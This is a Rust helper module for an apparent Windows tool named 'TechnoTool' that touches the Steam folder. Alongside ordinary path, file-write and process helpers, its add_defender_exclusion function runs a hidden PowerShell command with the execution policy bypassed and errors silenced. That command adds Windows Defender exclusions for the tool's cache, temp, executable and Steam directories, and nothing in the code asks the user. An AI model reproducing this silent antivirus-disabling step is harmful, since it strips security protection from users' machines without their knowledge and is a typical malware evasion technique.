use std::path::PathBuf;

pub fn log(msg: &str) {
    eprintln!("{}", msg);
}

pub fn local_app_data() -> PathBuf {
    match std::env::var("LOCALAPPDATA") {
        Ok(v) if !v.is_empty() => PathBuf::from(v),
        _ => std::env::temp_dir(),
    }
}

pub fn cache_dir() -> PathBuf {
    let p = local_app_data().join("TechnoTool");
    let _ = std::fs::create_dir_all(&p);
    p
}

pub fn temp_dir() -> PathBuf {
    let p = cache_dir().join("tmp");
    let _ = std::fs::create_dir_all(&p);
    p
}

pub fn is_digits(s: &str) -> bool {
    !s.is_empty() && s.chars().all(|c| c.is_ascii_digit())
}

#[cfg(windows)]
#[link(name = "shell32")]
extern "system" {
    fn IsUserAnAdmin() -> i32;
}

pub fn is_admin() -> bool {
    #[cfg(windows)]
    unsafe {
        IsUserAnAdmin() != 0
    }
    #[cfg(not(windows))]
    {
        false
    }
}

pub fn collect_av_targets() -> Vec<String> {
    let mut paths: Vec<std::path::PathBuf> = vec![cache_dir(), temp_dir(), std::env::temp_dir()];
    if let Ok(exe) = std::env::current_exe() {
        if let Some(p) = exe.parent() {
            paths.push(p.to_path_buf());
        }
    }
    paths.push(crate::steam::steam_path().map(std::path::PathBuf::from).unwrap_or_default());
    let mut seen = std::collections::HashSet::new();
    let mut out = Vec::new();
    for p in paths {
        if p.as_os_str().is_empty() {
            continue;
        }
        let key = p.to_string_lossy().to_lowercase();
        if !seen.insert(key) {
            continue;
        }
        if p.exists() {
            out.push(p.to_string_lossy().to_string());
        }
    }
    out
}

pub fn add_defender_exclusion() -> bool {
    if !is_admin() {
        log("[av] not admin — skipping Defender exclusions");
        return false;
    }
    let targets = collect_av_targets();
    if targets.is_empty() {
        return false;
    }
    let mut ps = String::from("$ErrorActionPreference='SilentlyContinue'; ");
    let cmds: Vec<String> = targets
        .iter()
        .map(|p| format!("Add-MpPreference -ExclusionPath \"{}\"", p.replace('"', "")))
        .collect();
    ps.push_str(&cmds.join("; "));
    let _ = std::process::Command::new("powershell")
        .args([
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            &ps,
        ])
        .creation_flags_no_window()
        .output();
    log(&format!(
        "[av] Defender exclusions requested for {} paths",
        targets.len()
    ));
    true
}

pub fn write_resilient(path: &std::path::Path, data: &[u8], retries: u32) -> bool {
    if let Some(parent) = path.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    let size = data.len() as u64;
    for attempt in 0..retries {
        let tmp = path
            .parent()
            .unwrap_or_else(|| std::path::Path::new("."))
            .join(format!(".{}.tmp", uuid::Uuid::new_v4().simple()));
        let mut ok = false;
        if let Ok(mut f) = std::fs::File::create(&tmp) {
            use std::io::Write;
            if f.write_all(data).is_ok() {
                let _ = f.flush();
                let _ = f.sync_all();
                drop(f);
                if path.exists() {
                    let _ = std::fs::remove_file(path);
                }
                if std::fs::rename(&tmp, path).is_ok() || move_path(&tmp, path).is_ok() {
                    if let Ok(m) = std::fs::metadata(path) {
                        if m.len() == size {
                            ok = true;
                        }
                    }
                }
            }
        }
        let _ = std::fs::remove_file(&tmp);
        if ok {
            return true;
        }
        std::thread::sleep(std::time::Duration::from_millis(300 * (attempt as u64 + 1)));
    }
    false
}

pub fn open_url(url: &str) {
    let _ = std::process::Command::new("cmd")
        .args(["/C", "start", "", url])
        .creation_flags_no_window()
        .spawn();
}

trait NoWindow {
    fn creation_flags_no_window(&mut self) -> &mut Self;
}

impl NoWindow for std::process::Command {
    fn creation_flags_no_window(&mut self) -> &mut Self {
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            self.creation_flags(0x0800_0000);
        }
        self
    }
}

pub fn taskkill(image: &str) {
    let _ = std::process::Command::new("taskkill")
        .args(["/f", "/im", image])
        .creation_flags_no_window()
        .output();
}

pub fn open_detached(exe: &str, cwd: Option<&std::path::Path>) {
    let mut cmd = std::process::Command::new(exe);
    if let Some(c) = cwd {
        cmd.current_dir(c);
    }
    let _ = cmd.spawn();
}

pub fn urlencode(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for b in s.bytes() {
        let c = b as char;
        if c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '~') {
            out.push(c);
        } else {
            out.push_str(&format!("%{:02X}", b));
        }
    }
    out
}

pub fn move_path(from: &std::path::Path, to: &std::path::Path) -> std::io::Result<()> {
    if std::fs::rename(from, to).is_ok() {
        return Ok(());
    }
    let meta = std::fs::symlink_metadata(from)?;
    if meta.is_dir() {
        copy_dir(from, to)?;
        std::fs::remove_dir_all(from)?;
    } else {
        if let Some(parent) = to.parent() {
            std::fs::create_dir_all(parent)?;
        }
        std::fs::copy(from, to)?;
        std::fs::remove_file(from)?;
    }
    Ok(())
}

fn copy_dir(from: &std::path::Path, to: &std::path::Path) -> std::io::Result<()> {
    std::fs::create_dir_all(to)?;
    for entry in std::fs::read_dir(from)? {
        let entry = entry?;
        let ty = entry.file_type()?;
        let dest = to.join(entry.file_name());
        if ty.is_dir() {
            copy_dir(&entry.path(), &dest)?;
        } else {
            std::fs::copy(entry.path(), &dest)?;
        }
    }
    Ok(())
}
